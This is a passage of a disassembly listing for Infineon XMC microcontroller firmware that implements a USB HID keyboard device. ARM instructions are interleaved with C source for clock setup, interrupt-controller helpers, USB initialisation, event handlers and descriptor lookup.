 800090a:	2004      	movs	r0, #4
 800090c:	f001 f844 	bl	8001998 <XMC_SCU_CLOCK_SetUsbClockDivider>
	XMC_SCU_CLOCK_SetUsbClockSource(XMC_SCU_CLOCK_USBCLKSRC_USBPLL);
 8000910:	2000      	movs	r0, #0
 8000912:	f000 ff49 	bl	80017a8 <XMC_SCU_CLOCK_SetUsbClockSource>
	XMC_SCU_CLOCK_EnableClock(XMC_SCU_CLOCK_USB);
 8000916:	2001      	movs	r0, #1
 8000918:	f001 f898 	bl	8001a4c <XMC_SCU_CLOCK_EnableClock>

	SystemCoreClockUpdate();
 800091c:	f005 fdfa 	bl	8006514 <SystemCoreClockUpdate>
}
 8000920:	bf00      	nop
 8000922:	bd80      	pop	{r7, pc}
 8000924:	08006908 	.word	0x08006908

08000928 <__NVIC_GetPriorityGrouping>:
  \brief   Get Priority Grouping
  \details Reads the priority grouping field from the NVIC Interrupt Controller.
  \return                Priority grouping field (SCB->AIRCR [10:8] PRIGROUP field).
 */
__STATIC_INLINE uint32_t __NVIC_GetPriorityGrouping(void)
{
 8000928:	b480      	push	{r7}
 800092a:	af00      	add	r7, sp, #0
  return ((uint32_t)((SCB->AIRCR & SCB_AIRCR_PRIGROUP_Msk) >> SCB_AIRCR_PRIGROUP_Pos));
 800092c:	4b04      	ldr	r3, [pc, #16]	; (8000940 <__NVIC_GetPriorityGrouping+0x18>)
 800092e:	68db      	ldr	r3, [r3, #12]
 8000930:	0a1b      	lsrs	r3, r3, #8
 8000932:	f003 0307 	and.w	r3, r3, #7
}
 8000936:	4618      	mov	r0, r3
 8000938:	46bd      	mov	sp, r7
 800093a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800093e:	4770      	bx	lr
 8000940:	e000ed00 	.word	0xe000ed00

08000944 <__NVIC_EnableIRQ>:
  \details Enables a device specific interrupt in the NVIC interrupt controller.
  \param [in]      IRQn  Device specific interrupt number.
  \note    IRQn must not be negative.
 */
__STATIC_INLINE void __NVIC_EnableIRQ(IRQn_Type IRQn)
{
 8000944:	b480      	push	{r7}
 8000946:	b083      	sub	sp, #12
 8000948:	af00      	add	r7, sp, #0
 800094a:	4603      	mov	r3, r0
 800094c:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 800094e:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8000952:	2b00      	cmp	r3, #0
 8000954:	db0b      	blt.n	800096e <__NVIC_EnableIRQ+0x2a>
  {
    NVIC->ISER[(((uint32_t)(int32_t)IRQn) >> 5UL)] = (uint32_t)(1UL << (((uint32_t)(int32_t)IRQn) & 0x1FUL));
 8000956:	79fb      	ldrb	r3, [r7, #7]
 8000958:	f003 021f 	and.w	r2, r3, #31
 800095c:	4907      	ldr	r1, [pc, #28]	; (800097c <__NVIC_EnableIRQ+0x38>)
 800095e:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8000962:	095b      	lsrs	r3, r3, #5
 8000964:	2001      	movs	r0, #1
 8000966:	fa00 f202 	lsl.w	r2, r0, r2
 800096a:	f841 2023 	str.w	r2, [r1, r3, lsl #2]
  }
}
 800096e:	bf00      	nop
 8000970:	370c      	adds	r7, #12
 8000972:	46bd      	mov	sp, r7
 8000974:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000978:	4770      	bx	lr
 800097a:	bf00      	nop
 800097c:	e000e100 	.word	0xe000e100

08000980 <__NVIC_ClearPendingIRQ>:
  \details Clears the pending bit of a device specific interrupt in the NVIC pending register.
  \param [in]      IRQn  Device specific interrupt number.
  \note    IRQn must not be negative.
 */
__STATIC_INLINE void __NVIC_ClearPendingIRQ(IRQn_Type IRQn)
{
 8000980:	b480      	push	{r7}
 8000982:	b083      	sub	sp, #12
 8000984:	af00      	add	r7, sp, #0
 8000986:	4603      	mov	r3, r0
 8000988:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 800098a:	f997 3007 	ldrsb.w	r3, [r7, #7]
 800098e:	2b00      	cmp	r3, #0
 8000990:	db0c      	blt.n	80009ac <__NVIC_ClearPendingIRQ+0x2c>
  {
    NVIC->ICPR[(((uint32_t)(int32_t)IRQn) >> 5UL)] = (uint32_t)(1UL << (((uint32_t)(int32_t)IRQn) & 0x1FUL));
 8000992:	79fb      	ldrb	r3, [r7, #7]
 8000994:	f003 021f 	and.w	r2, r3, #31
 8000998:	4907      	ldr	r1, [pc, #28]	; (80009b8 <__NVIC_ClearPendingIRQ+0x38>)
 800099a:	f997 3007 	ldrsb.w	r3, [r7, #7]
 800099e:	095b      	lsrs	r3, r3, #5
 80009a0:	2001      	movs	r0, #1
 80009a2:	fa00 f202 	lsl.w	r2, r0, r2
 80009a6:	3360      	adds	r3, #96	; 0x60
 80009a8:	f841 2023 	str.w	r2, [r1, r3, lsl #2]
  }
}
 80009ac:	bf00      	nop
 80009ae:	370c      	adds	r7, #12
 80009b0:	46bd      	mov	sp, r7
 80009b2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80009b6:	4770      	bx	lr
 80009b8:	e000e100 	.word	0xe000e100

080009bc <__NVIC_SetPriority>:
  \param [in]      IRQn  Interrupt number.
  \param [in]  priority  Priority to set.
  \note    The priority cannot be set for every processor exception.
 */
__STATIC_INLINE void __NVIC_SetPriority(IRQn_Type IRQn, uint32_t priority)
{
 80009bc:	b480      	push	{r7}
 80009be:	b083      	sub	sp, #12
 80009c0:	af00      	add	r7, sp, #0
 80009c2:	4603      	mov	r3, r0
 80009c4:	6039      	str	r1, [r7, #0]
 80009c6:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 80009c8:	f997 3007 	ldrsb.w	r3, [r7, #7]
 80009cc:	2b00      	cmp	r3, #0
 80009ce:	db0a      	blt.n	80009e6 <__NVIC_SetPriority+0x2a>
  {
    NVIC->IP[((uint32_t)(int32_t)IRQn)]               = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 80009d0:	683b      	ldr	r3, [r7, #0]
 80009d2:	b2da      	uxtb	r2, r3
 80009d4:	490c      	ldr	r1, [pc, #48]	; (8000a08 <__NVIC_SetPriority+0x4c>)
 80009d6:	f997 3007 	ldrsb.w	r3, [r7, #7]
 80009da:	0092      	lsls	r2, r2, #2
 80009dc:	b2d2      	uxtb	r2, r2
 80009de:	440b      	add	r3, r1
 80009e0:	f883 2300 	strb.w	r2, [r3, #768]	; 0x300
  }
  else
  {
    SCB->SHP[(((uint32_t)(int32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
  }
}
 80009e4:	e00a      	b.n	80009fc <__NVIC_SetPriority+0x40>
    SCB->SHP[(((uint32_t)(int32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 80009e6:	683b      	ldr	r3, [r7, #0]
 80009e8:	b2da      	uxtb	r2, r3
 80009ea:	4908      	ldr	r1, [pc, #32]	; (8000a0c <__NVIC_SetPriority+0x50>)
 80009ec:	79fb      	ldrb	r3, [r7, #7]
 80009ee:	f003 030f 	and.w	r3, r3, #15
 80009f2:	3b04      	subs	r3, #4
 80009f4:	0092      	lsls	r2, r2, #2
 80009f6:	b2d2      	uxtb	r2, r2
 80009f8:	440b      	add	r3, r1
 80009fa:	761a      	strb	r2, [r3, #24]
}
 80009fc:	bf00      	nop
 80009fe:	370c      	adds	r7, #12
 8000a00:	46bd      	mov	sp, r7
 8000a02:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000a06:	4770      	bx	lr
 8000a08:	e000e100 	.word	0xe000e100
 8000a0c:	e000ed00 	.word	0xe000ed00

08000a10 <NVIC_EncodePriority>:
  \param [in]   PreemptPriority  Preemptive priority value (starting from 0).
  \param [in]       SubPriority  Subpriority value (starting from 0).
  \return                        Encoded priority. Value can be used in the function \ref NVIC_SetPriority().
 */
__STATIC_INLINE uint32_t NVIC_EncodePriority (uint32_t PriorityGroup, uint32_t PreemptPriority, uint32_t SubPriority)
{
 8000a10:	b480      	push	{r7}
 8000a12:	b089      	sub	sp, #36	; 0x24
 8000a14:	af00      	add	r7, sp, #0
 8000a16:	60f8      	str	r0, [r7, #12]
 8000a18:	60b9      	str	r1, [r7, #8]
 8000a1a:	607a      	str	r2, [r7, #4]
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);   /* only values 0..7 are used          */
 8000a1c:	68fb      	ldr	r3, [r7, #12]
 8000a1e:	f003 0307 	and.w	r3, r3, #7
 8000a22:	61fb      	str	r3, [r7, #28]
  uint32_t PreemptPriorityBits;
  uint32_t SubPriorityBits;

  PreemptPriorityBits = ((7UL - PriorityGroupTmp) > (uint32_t)(__NVIC_PRIO_BITS)) ? (uint32_t)(__NVIC_PRIO_BITS) : (uint32_t)(7UL - PriorityGroupTmp);
 8000a24:	69fb      	ldr	r3, [r7, #28]
 8000a26:	f1c3 0307 	rsb	r3, r3, #7
 8000a2a:	2b06      	cmp	r3, #6
 8000a2c:	bf28      	it	cs
 8000a2e:	2306      	movcs	r3, #6
 8000a30:	61bb      	str	r3, [r7, #24]
  SubPriorityBits     = ((PriorityGroupTmp + (uint32_t)(__NVIC_PRIO_BITS)) < (uint32_t)7UL) ? (uint32_t)0UL : (uint32_t)((PriorityGroupTmp - 7UL) + (uint32_t)(__NVIC_PRIO_BITS));
 8000a32:	69fb      	ldr	r3, [r7, #28]
 8000a34:	3306      	adds	r3, #6
 8000a36:	2b06      	cmp	r3, #6
 8000a38:	d902      	bls.n	8000a40 <NVIC_EncodePriority+0x30>
 8000a3a:	69fb      	ldr	r3, [r7, #28]
 8000a3c:	3b01      	subs	r3, #1
 8000a3e:	e000      	b.n	8000a42 <NVIC_EncodePriority+0x32>
 8000a40:	2300      	movs	r3, #0
 8000a42:	617b      	str	r3, [r7, #20]

  return (
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 8000a44:	f04f 32ff 	mov.w	r2, #4294967295	; 0xffffffff
 8000a48:	69bb      	ldr	r3, [r7, #24]
 8000a4a:	fa02 f303 	lsl.w	r3, r2, r3
 8000a4e:	43da      	mvns	r2, r3
 8000a50:	68bb      	ldr	r3, [r7, #8]
 8000a52:	401a      	ands	r2, r3
 8000a54:	697b      	ldr	r3, [r7, #20]
 8000a56:	409a      	lsls	r2, r3
           ((SubPriority     & (uint32_t)((1UL << (SubPriorityBits    )) - 1UL)))
 8000a58:	f04f 31ff 	mov.w	r1, #4294967295	; 0xffffffff
 8000a5c:	697b      	ldr	r3, [r7, #20]
 8000a5e:	fa01 f303 	lsl.w	r3, r1, r3
 8000a62:	43d9      	mvns	r1, r3
 8000a64:	687b      	ldr	r3, [r7, #4]
 8000a66:	400b      	ands	r3, r1
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 8000a68:	4313      	orrs	r3, r2
         );
}
 8000a6a:	4618      	mov	r0, r3
 8000a6c:	3724      	adds	r7, #36	; 0x24
 8000a6e:	46bd      	mov	sp, r7
 8000a70:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000a74:	4770      	bx	lr
	...

08000a78 <USB0_0_IRQHandler>:
	.usbd_transfer_mode = XMC_USBD_USE_FIFO,
	.cb_xmc_device_event = USBD_SignalDeviceEventHandler,
	.cb_endpoint_event = USBD_SignalEndpointEvent_Handler
};

void USB0_0_IRQHandler(void) {
 8000a78:	b580      	push	{r7, lr}
 8000a7a:	af00      	add	r7, sp, #0
	XMC_USBD_IRQHandler(&USB_runtime);
 8000a7c:	4802      	ldr	r0, [pc, #8]	; (8000a88 <USB0_0_IRQHandler+0x10>)
 8000a7e:	f004 fb21 	bl	80050c4 <XMC_USBD_IRQHandler>
}
 8000a82:	bf00      	nop
 8000a84:	bd80      	pop	{r7, pc}
 8000a86:	bf00      	nop
 8000a88:	20000204 	.word	0x20000204

08000a8c <USB_Init>:

/*The function initializes the USB core layer and register call backs. */
void USB_Init(void) {
 8000a8c:	b580      	push	{r7, lr}
 8000a8e:	af00      	add	r7, sp, #0
	USBD_Initialize(&USB_runtime);
 8000a90:	480e      	ldr	r0, [pc, #56]	; (8000acc <USB_Init+0x40>)
 8000a92:	f003 fc15 	bl	80042c0 <USBD_Initialize>

	/* Interrupts configuration*/
	NVIC_SetPriority( USB0_0_IRQn,
 8000a96:	f7ff ff47 	bl	8000928 <__NVIC_GetPriorityGrouping>
 8000a9a:	4603      	mov	r3, r0
 8000a9c:	2200      	movs	r2, #0
 8000a9e:	213f      	movs	r1, #63	; 0x3f
 8000aa0:	4618      	mov	r0, r3
 8000aa2:	f7ff ffb5 	bl	8000a10 <NVIC_EncodePriority>
 8000aa6:	4603      	mov	r3, r0
 8000aa8:	4619      	mov	r1, r3
 8000aaa:	206b      	movs	r0, #107	; 0x6b
 8000aac:	f7ff ff86 	bl	80009bc <__NVIC_SetPriority>
					  NVIC_EncodePriority(NVIC_GetPriorityGrouping(), 63, 0) );
	NVIC_ClearPendingIRQ(USB0_0_IRQn);
 8000ab0:	206b      	movs	r0, #107	; 0x6b
 8000ab2:	f7ff ff65 	bl	8000980 <__NVIC_ClearPendingIRQ>
	NVIC_EnableIRQ(USB0_0_IRQn);
 8000ab6:	206b      	movs	r0, #107	; 0x6b
 8000ab8:	f7ff ff44 	bl	8000944 <__NVIC_EnableIRQ>
			 *  register and despite the datasheet making no mention of its requirement in host mode.
			 */
			static inline void USB_Attach(void) ATTR_ALWAYS_INLINE;
			static inline void USB_Attach(void)
			{
				device.Driver->DeviceConnect();
 8000abc:	4b04      	ldr	r3, [pc, #16]	; (8000ad0 <USB_Init+0x44>)
 8000abe:	681b      	ldr	r3, [r3, #0]
 8000ac0:	68db      	ldr	r3, [r3, #12]
 8000ac2:	4798      	blx	r3
			}
 8000ac4:	bf00      	nop

	/* USB Connection*/
	USB_Attach();
}
 8000ac6:	bf00      	nop
 8000ac8:	bd80      	pop	{r7, pc}
 8000aca:	bf00      	nop
 8000acc:	20000204 	.word	0x20000204
 8000ad0:	2000070c 	.word	0x2000070c

08000ad4 <EVENT_USB_Device_>:

/** Event handler for the library USB Connection event. */
void EVENT_USB_Device_(void) {
 8000ad4:	b480      	push	{r7}
 8000ad6:	af00      	add	r7, sp, #0
}
 8000ad8:	bf00      	nop
 8000ada:	46bd      	mov	sp, r7
 8000adc:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000ae0:	4770      	bx	lr

08000ae2 <EVENT_USB_Device_Connect>:
/** Event handler for the library USB Connection event. */
void EVENT_USB_Device_Connect(void) {
 8000ae2:	b480      	push	{r7}
 8000ae4:	af00      	add	r7, sp, #0
	//Device is ready!
}
 8000ae6:	bf00      	nop
 8000ae8:	46bd      	mov	sp, r7
 8000aea:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000aee:	4770      	bx	lr

08000af0 <EVENT_USB_Device_Reset>:

/** Event handler for the library USB Disconnection event. */
void EVENT_USB_Device_Reset(void) {
 8000af0:	b580      	push	{r7, lr}
 8000af2:	af00      	add	r7, sp, #0
	if(device.IsConfigured) {
 8000af4:	4b09      	ldr	r3, [pc, #36]	; (8000b1c <EVENT_USB_Device_Reset+0x2c>)
 8000af6:	f893 313e 	ldrb.w	r3, [r3, #318]	; 0x13e
 8000afa:	f003 0301 	and.w	r3, r3, #1
 8000afe:	b2db      	uxtb	r3, r3
 8000b00:	2b00      	cmp	r3, #0
 8000b02:	d008      	beq.n	8000b16 <EVENT_USB_Device_Reset+0x26>
		USB_Init();
 8000b04:	f7ff ffc2 	bl	8000a8c <USB_Init>
		device.IsConfigured=0;
 8000b08:	4a04      	ldr	r2, [pc, #16]	; (8000b1c <EVENT_USB_Device_Reset+0x2c>)
 8000b0a:	f892 313e 	ldrb.w	r3, [r2, #318]	; 0x13e
 8000b0e:	f36f 0300 	bfc	r3, #0, #1
 8000b12:	f882 313e 	strb.w	r3, [r2, #318]	; 0x13e
	}
}
 8000b16:	bf00      	nop
 8000b18:	bd80      	pop	{r7, pc}
 8000b1a:	bf00      	nop
 8000b1c:	2000070c 	.word	0x2000070c

08000b20 <EVENT_USB_Device_ConfigurationChanged>:

/** Event handler for the library USB Configuration Changed event. */
void EVENT_USB_Device_ConfigurationChanged(void) {
 8000b20:	b580      	push	{r7, lr}
 8000b22:	b082      	sub	sp, #8
 8000b24:	af00      	add	r7, sp, #0
	bool ConfigSuccess = true;
 8000b26:	2301      	movs	r3, #1
 8000b28:	71fb      	strb	r3, [r7, #7]

	USBD_SetEndpointBuffer(KEYBOARD_IN_EPADDR, buffer, KEYBOARD_REPORT_SIZE);
 8000b2a:	2208      	movs	r2, #8
 8000b2c:	490d      	ldr	r1, [pc, #52]	; (8000b64 <EVENT_USB_Device_ConfigurationChanged+0x44>)
 8000b2e:	2081      	movs	r0, #129	; 0x81
 8000b30:	f003 fc3c 	bl	80043ac <USBD_SetEndpointBuffer>

	ConfigSuccess &= HID_Device_ConfigureEndpoints(&Keyboard_HID_Interface);
 8000b34:	480c      	ldr	r0, [pc, #48]	; (8000b68 <EVENT_USB_Device_ConfigurationChanged+0x48>)
 8000b36:	f001 ff91 	bl	8002a5c <HID_Device_ConfigureEndpoints>
 8000b3a:	4603      	mov	r3, r0
 8000b3c:	461a      	mov	r2, r3
 8000b3e:	79fb      	ldrb	r3, [r7, #7]
 8000b40:	4013      	ands	r3, r2
 8000b42:	2b00      	cmp	r3, #0
 8000b44:	bf14      	ite	ne
 8000b46:	2301      	movne	r3, #1
 8000b48:	2300      	moveq	r3, #0
 8000b4a:	71fb      	strb	r3, [r7, #7]

	device.IsConfigured = ConfigSuccess;
 8000b4c:	4a07      	ldr	r2, [pc, #28]	; (8000b6c <EVENT_USB_Device_ConfigurationChanged+0x4c>)
 8000b4e:	f892 313e 	ldrb.w	r3, [r2, #318]	; 0x13e
 8000b52:	79f9      	ldrb	r1, [r7, #7]
 8000b54:	f361 0300 	bfi	r3, r1, #0, #1
 8000b58:	f882 313e 	strb.w	r3, [r2, #318]	; 0x13e
}
 8000b5c:	bf00      	nop
 8000b5e:	3708      	adds	r7, #8
 8000b60:	46bd      	mov	sp, r7
 8000b62:	bd80      	pop	{r7, pc}
 8000b64:	20000680 	.word	0x20000680
 8000b68:	200001ec 	.word	0x200001ec
 8000b6c:	2000070c 	.word	0x2000070c

08000b70 <EVENT_USB_Device_ControlRequest>:

/** Event handler for the library USB Control Request reception event. */
void EVENT_USB_Device_ControlRequest(void) {
 8000b70:	b580      	push	{r7, lr}
 8000b72:	af00      	add	r7, sp, #0
	HID_Device_ProcessControlRequest(&Keyboard_HID_Interface);
 8000b74:	4802      	ldr	r0, [pc, #8]	; (8000b80 <EVENT_USB_Device_ControlRequest+0x10>)
 8000b76:	f001 fd7b 	bl	8002670 <HID_Device_ProcessControlRequest>
}
 8000b7a:	bf00      	nop
 8000b7c:	bd80      	pop	{r7, pc}
 8000b7e:	bf00      	nop
 8000b80:	200001ec 	.word	0x200001ec

08000b84 <CALLBACK_HIDParser_FilterHIDReportItem>:

bool CALLBACK_HIDParser_FilterHIDReportItem(
									HID_ReportItem_t* const CurrentItem ) {
 8000b84:	b480      	push	{r7}
 8000b86:	b083      	sub	sp, #12
 8000b88:	af00      	add	r7, sp, #0
 8000b8a:	6078      	str	r0, [r7, #4]
	return true;
 8000b8c:	2301      	movs	r3, #1
}
 8000b8e:	4618      	mov	r0, r3
 8000b90:	370c      	adds	r7, #12
 8000b92:	46bd      	mov	sp, r7
 8000b94:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000b98:	4770      	bx	lr
	...

08000b9c <CALLBACK_USB_GetDescriptor>:
  *  the control endpoint, this function is called so that the descriptor details
  *  can be passed back and the appropriate descriptor sent back to the USB host.
  **/
uint16_t CALLBACK_USB_GetDescriptor( const uint16_t wValue,
									 const uint8_t wIndex,
									 const void** const DescriptorAddress ) {
 8000b9c:	b480      	push	{r7}
 8000b9e:	b085      	sub	sp, #20
 8000ba0:	af00      	add	r7, sp, #0
 8000ba2:	4603      	mov	r3, r0
 8000ba4:	603a      	str	r2, [r7, #0]
 8000ba6:	80fb      	strh	r3, [r7, #6]
 8000ba8:	460b      	mov	r3, r1
 8000baa:	717b      	strb	r3, [r7, #5]
	const uint8_t  DescriptorType   = (wValue >> 8);
 8000bac:	88fb      	ldrh	r3, [r7, #6]
 8000bae:	0a1b      	lsrs	r3, r3, #8
 8000bb0:	b29b      	uxth	r3, r3
 8000bb2:	727b      	strb	r3, [r7, #9]
	const uint8_t  DescriptorNumber = (wValue & 0xFF);
 8000bb4:	88fb      	ldrh	r3, [r7, #6]
 8000bb6:	723b      	strb	r3, [r7, #8]

	const void* Address = NULL;
 8000bb8:	2300      	movs	r3, #0
 8000bba:	60fb      	str	r3, [r7, #12]
	uint16_t    Size    = NO_DESCRIPTOR;
 8000bbc:	2300      	movs	r3, #0
 8000bbe:	817b      	strh	r3, [r7, #10]

	switch (DescriptorType) {
 8000bc0:	7a7b      	ldrb	r3, [r7, #9]
 8000bc2:	3b01      	subs	r3, #1
 8000bc4:	2b21      	cmp	r3, #33	; 0x21
 8000bc6:	d876      	bhi.n	8000cb6 <CALLBACK_USB_GetDescriptor+0x11a>
 8000bc8:	a201      	add	r2, pc, #4	; (adr r2, 8000bd0 <CALLBACK_USB_GetDescriptor+0x34>)
 8000bca:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8000bce:	bf00      	nop
 8000bd0:	08000c59 	.word	0x08000c59
 8000bd4:	08000c63 	.word	0x08000c63
 8000bd8:	08000c6d 	.word	0x08000c6d
 8000bdc:	08000cb7 	.word	0x08000cb7
 8000be0:	08000cb7 	.word	0x08000cb7
 8000be4:	08000cb7 	.word	0x08000cb7
 8000be8:	08000cb7 	.word	0x08000cb7
 8000bec:	08000cb7 	.word	0x08000cb7
 8000bf0:	08000cb7 	.word	0x08000cb7
 8000bf4:	08000cb7 	.word	0x08000cb7
 8000bf8:	08000cb7 	.word	0x08000cb7
 8000bfc:	08000cb7 	.word	0x08000cb7
 8000c00:	08000cb7 	.word	0x08000cb7
 8000c04:	08000cb7 	.word	0x08000cb7
 8000c08:	08000cb7 	.word	0x08000cb7
 8000c0c:	08000cb7 	.word	0x08000cb7
 8000c10:	08000cb7 	.word	0x08000cb7
 8000c14:	08000cb7 	.word	0x08000cb7
 8000c18:	08000cb7 	.word	0x08000cb7
 8000c1c:	08000cb7 	.word	0x08000cb7
 8000c20:	08000cb7 	.word	0x08000cb7
 8000c24:	08000cb7 	.word	0x08000cb7
 8000c28:	08000cb7 	.word	0x08000cb7
 8000c2c:	08000cb7 	.word	0x08000cb7
 8000c30:	08000cb7 	.word	0x08000cb7
 8000c34:	08000cb7 	.word	0x08000cb7
 8000c38:	08000cb7 	.word	0x08000cb7
 8000c3c:	08000cb7 	.word	0x08000cb7
 8000c40:	08000cb7 	.word	0x08000cb7
 8000c44:	08000cb7 	.word	0x08000cb7
 8000c48:	08000cb7 	.word	0x08000cb7
 8000c4c:	08000cb7 	.word	0x08000cb7
 8000c50:	08000ca1 	.word	0x08000ca1
 8000c54:	08000cab 	.word	0x08000cab
		case DTYPE_Device:
			Address = &DeviceDescriptor;
 8000c58:	4b1c      	ldr	r3, [pc, #112]	; (8000ccc <CALLBACK_USB_GetDescriptor+0x130>)
 8000c5a:	60fb      	str	r3, [r7, #12]
			Size    = sizeof(USB_Descriptor_Device_t);
 8000c5c:	2312      	movs	r3, #18
 8000c5e:	817b      	strh	r3, [r7, #10]
			break;
 8000c60:	e029      	b.n	8000cb6 <CALLBACK_USB_GetDescriptor+0x11a>
		case DTYPE_Configuration:
			Address = &ConfigurationDescriptor;
 8000c62:	4b1b      	ldr	r3, [pc, #108]	; (8000cd0 <CALLBACK_USB_GetDescriptor+0x134>)
 8000c64:	60fb      	str	r3, [r7, #12]
			Size    = sizeof(USB_Descriptor_Configuration_t);
 8000c66:	2322      	movs	r3, #34	; 0x22
 8000c68:	817b      	strh	r3, [r7, #10]
			break;
 8000c6a:	e024      	b.n	8000cb6 <CALLBACK_USB_GetDescriptor+0x11a>
		case DTYPE_String:
			switch (DescriptorNumber) {
 8000c6c:	7a3b      	ldrb	r3, [r7, #8]
 8000c6e:	2b02      	cmp	r3, #2
 8000c70:	d010      	beq.n	8000c94 <CALLBACK_USB_GetDescriptor+0xf8>
 8000c72:	2b02      	cmp	r3, #2
 8000c74:	dc1e      	bgt.n	8000cb4 <CALLBACK_USB_GetDescriptor+0x118>
 8000c76:	2b00      	cmp	r3, #0
 8000c78:	d002      	beq.n	8000c80 <CALLBACK_USB_GetDescriptor+0xe4>
 8000c7a:	2b01      	cmp	r3, #1
 8000c7c:	d005      	beq.n	8000c8a <CALLBACK_USB_GetDescriptor+0xee>
				case STRING_ID_Product:
					Address = &ProductString;
					Size    = ProductString.Header.Size;
					break;
			}
			break;
 8000c7e:	e019      	b.n	8000cb4 <CALLBACK_USB_GetDescriptor+0x118>
					Address = &LanguageString;
 8000c80:	4b14      	ldr	r3, [pc, #80]	; (8000cd4 <CALLBACK_USB_GetDescriptor+0x138>)
 8000c82:	60fb      	str	r3, [r7, #12]
					Size    = LanguageString.Header.Size;
 8000c84:	2304      	movs	r3, #4
 8000c86:	817b      	strh	r3, [r7, #10]
					break;
 8000c88:	e009      	b.n	8000c9e <CALLBACK_USB_GetDescriptor+0x102>
					Address = &ManufacturerString;
 8000c8a:	4b13      	ldr	r3, [pc, #76]	; (8000cd8 <CALLBACK_USB_GetDescriptor+0x13c>)
 8000c8c:	60fb      	str	r3, [r7, #12]
					Size    = ManufacturerString.Header.Size;
 8000c8e:	2350      	movs	r3, #80	; 0x50
 8000c90:	817b      	strh	r3, [r7, #10]
					break;
 8000c92:	e004      	b.n	8000c9e <CALLBACK_USB_GetDescriptor+0x102>
					Address = &ProductString;
 8000c94:	4b11      	ldr	r3, [pc, #68]	; (8000cdc <CALLBACK_USB_GetDescriptor+0x140>)
 8000c96:	60fb      	str	r3, [r7, #12]
					Size    = ProductString.Header.Size;
 8000c98:	2348      	movs	r3, #72	; 0x48
 8000c9a:	817b      	strh	r3, [r7, #10]
					break;
 8000c9c:	bf00      	nop
			break;
 8000c9e:	e009      	b.n	8000cb4 <CALLBACK_USB_GetDescriptor+0x118>
		case HID_DTYPE_HID:
			Address = &ConfigurationDescriptor.HID_KeyboardHID;
 8000ca0:	4b0f      	ldr	r3, [pc, #60]	; (8000ce0 <CALLBACK_USB_GetDescriptor+0x144>)
 8000ca2:	60fb      	str	r3, [r7, #12]
			Size    = sizeof(USB_HID_Descriptor_HID_t);
 8000ca4:	2309      	movs	r3, #9
 8000ca6:	817b      	strh	r3, [r7, #10]
			break;
 8000ca8:	e005      	b.n	8000cb6 <CALLBACK_USB_GetDescriptor+0x11a>
		case HID_DTYPE_Report:
			Address = &KeyboardReport;
 8000caa:	4b0e      	ldr	r3, [pc, #56]	; (8000ce4 <CALLBACK_USB_GetDescriptor+0x148>)
 8000cac:	60fb      	str	r3, [r7, #12]
			Size    = sizeof(KeyboardReport);
 8000cae:	233f      	movs	r3, #63	; 0x3f
 8000cb0:	817b      	strh	r3, [r7, #10]
			break;
 8000cb2:	e000      	b.n	8000cb6 <CALLBACK_USB_GetDescriptor+0x11a>
			break;
 8000cb4:	bf00      	nop
	}

	*DescriptorAddress = Address;
 8000cb6:	683b      	ldr	r3, [r7, #0]
 8000cb8:	68fa      	ldr	r2, [r7, #12]
 8000cba:	601a      	str	r2, [r3, #0]
	return Size;
 8000cbc:	897b      	ldrh	r3, [r7, #10]
}
 8000cbe:	4618      	mov	r0, r3
 8000cc0:	3714      	adds	r7, #20
 8000cc2:	46bd      	mov	sp, r7
 8000cc4:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000cc8:	4770      	bx	lr
 8000cca:	bf00      	nop
 8000ccc:	0800695c 	.word	0x0800695c
 8000cd0:	08006970 	.word	0x08006970
 8000cd4:	08006994 	.word	0x08006994
 8000cd8:	0800699c 	.word	0x0800699c
 8000cdc:	080069f0 	.word	0x080069f0
 8000ce0:	08006982 	.word	0x08006982
 8000ce4:	0800691c 	.word	0x0800691c

08000ce8 <XMC_SCU_CLOCK_GetUsbClockSource>:
 * The clock source is read from from the \a USBSEL bits of \a USBCLKCR register.
 * \par<b>Related APIs:</b><BR>
 * XMC_SCU_CLOCK_SetUsbClockDivider(), XMC_SCU_CLOCK_GetUsbPllClockFrequency() \n\n\n
 */
__STATIC_INLINE XMC_SCU_CLOCK_USBCLKSRC_t XMC_SCU_CLOCK_GetUsbClockSource(void)
{
 8000ce8:	b480      	push	{r7}
 8000cea:	af00      	add	r7, sp, #0
  return (XMC_SCU_CLOCK_USBCLKSRC_t)(SCU_CLK->USBCLKCR & SCU_CLK_USBCLKCR_USBSEL_Msk);
 8000cec:	4b04      	ldr	r3, [pc, #16]	; (8000d00 <XMC_SCU_CLOCK_GetUsbClockSource+0x18>)
 8000cee:	699b      	ldr	r3, [r3, #24]
 8000cf0:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
}
 8000cf4:	4618      	mov	r0, r3
 8000cf6:	46bd      	mov	sp, r7
 8000cf8:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000cfc:	4770      	bx	lr
 8000cfe:	bf00      	nop
 8000d00:	50004600 	.word	0x50004600

08000d04 <XMC_SCU_CLOCK_GetWdtClockSource>:
 * the clock source selected.
 * \par<b>Related APIs:</b><BR>
 * XMC_SCU_CLOCK_SetWdtClockDivider(), XMC_SCU_CLOCK_SetWdtClockSource() \n\n\n
 */
